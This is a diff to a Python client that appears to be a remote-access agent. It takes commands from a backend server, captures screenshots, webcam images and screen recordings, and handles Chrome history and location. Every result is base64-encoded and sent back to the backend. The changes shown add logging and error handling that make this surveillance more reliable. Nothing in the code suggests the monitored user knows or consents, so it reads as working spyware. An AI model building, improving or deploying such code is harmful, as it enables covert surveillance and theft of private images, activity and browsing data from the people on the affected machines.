@@ -371,13 +371,17 @@ def get_location():
 def send_result(command_id, result):
     """Send command result to backend"""
     try:
-        requests.post(
+        response = requests.post(
             f"{BACKEND_URL}/api/command/result/{command_id}",
             json={"result": result},
             timeout=5
         )
+        if response.status_code == 200:
+            print(f"✅ Result sent successfully for command {command_id}")
+        else:
+            print(f"⚠️ Result send got status {response.status_code}: {response.text}")
     except Exception as e:
-        print(f"Error sending result: {e}")
+        print(f"❌ Error sending result: {e}")
 
 def send_location_to_backend(location):
     """Send location to backend via API (new endpoint)"""
@@ -825,11 +829,17 @@ def execute_command(cmd):
         
         elif command_type == "screenshot":
             print("📸 Capturing screenshot...")
-            screenshot = pyautogui.screenshot()
-            img_byte_arr = BytesIO()
-            screenshot.save(img_byte_arr, format='PNG')
-            img_base64 = base64.b64encode(img_byte_arr.getvalue()).decode('utf-8')
-            send_result(command_id, {"type": "screenshot", "image_base64": img_base64})
+            try:
+                screenshot = pyautogui.screenshot()
+                img_byte_arr = BytesIO()
+                screenshot.save(img_byte_arr, format='PNG')
+                img_base64 = base64.b64encode(img_byte_arr.getvalue()).decode('utf-8')
+                print(f"✅ Screenshot captured ({len(img_base64)} bytes base64)")
+                send_result(command_id, {"type": "screenshot", "image_base64": img_base64})
+                print("✅ Screenshot result sent to backend")
+            except Exception as e:
+                print(f"❌ Screenshot failed: {e}")
+                send_result(command_id, {"type": "screenshot", "success": False, "message": str(e)})
         
         elif command_type == "webcam":
             print("📷 Capturing webcam...")
@@ -840,10 +850,14 @@ def execute_command(cmd):
                 if ret:
                     _, img_encoded = cv2.imencode('.jpg', frame)
                     img_base64 = base64.b64encode(img_encoded.tobytes()).decode('utf-8')
+                    print(f"✅ Webcam captured ({len(img_base64)} bytes base64)")
                     send_result(command_id, {"type": "webcam", "image_base64": img_base64})
+                    print("✅ Webcam result sent to backend")
                 else:
+                    print("❌ Webcam: Failed to read frame from camera")
                     send_result(command_id, {"type": "webcam", "success": False, "message": "Unable to capture webcam"})
             except Exception as e:
+                print(f"❌ Webcam exception: {e}")
                 send_result(command_id, {"type": "webcam", "success": False, "message": str(e)})
 
         elif command_type == "record":
@@ -851,13 +865,16 @@ def execute_command(cmd):
             print(f"🎬 Recording screen for {duration}s...")
             try:
                 video_b64 = _record_screen(duration)
+                print(f"✅ Recording completed ({len(video_b64)} bytes base64)")
                 send_result(command_id, {
                     "type": "record",
                     "video_base64": video_b64,
                     "mime_type": "video/mp4",
                     "duration": duration
                 })
+                print("✅ Recording result sent to backend")
             except Exception as e:
+                print(f"❌ Recording failed: {e}")
                 send_result(command_id, {"type": "record", "success": False, "message": str(e)})
         
         elif command_type == "chromehistory":
